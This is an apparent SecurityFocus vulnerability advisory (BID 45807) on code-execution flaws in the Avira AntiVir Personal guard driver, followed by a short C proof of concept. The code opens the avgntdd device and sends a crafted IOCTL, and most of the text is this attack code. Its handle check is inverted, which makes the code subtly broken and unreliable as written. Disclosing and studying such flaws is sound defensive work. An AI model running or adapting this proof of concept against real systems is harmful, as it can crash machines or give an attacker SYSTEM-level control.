source: http://www.securityfocus.com/bid/45807/info

Avira AntiVir Personal is prone to multiple code-execution vulnerabilities.

Successful exploits may allow an attacker to execute arbitrary code with SYSTEM-level privileges. Failed exploit attempts will likely result in denial-of-service conditions.

Please note that these issues affect versions of the application that are no longer supported. 

#include <windows.h>

int main(int argc, char* argv[])
{
	char buffer[0x100];
	DWORD returned;
	HANDLE hDevice;

	hDevice = CreateFileW( L"\\\\.\\avgntdd", GENERIC_READ | GENERIC_WRITE, 0, 0, 3, 0x80, 0 );
	if( hDevice != INVALID_HANDLE_VALUE )
	{
		printf("Could not open handle to guard driver.\n");
		return 1;
	}
	
	memset( buffer, 0, sizeof(buffer) );
	
	if( !DeviceIoControl( hDevice, 0x0CABA020C, &buffer, sizeof(buffer), 0,0, &returned, 0) )
	{
		printf("Could not communicate with guard driver.\n");
		return 1;		
	}
	return 0;
}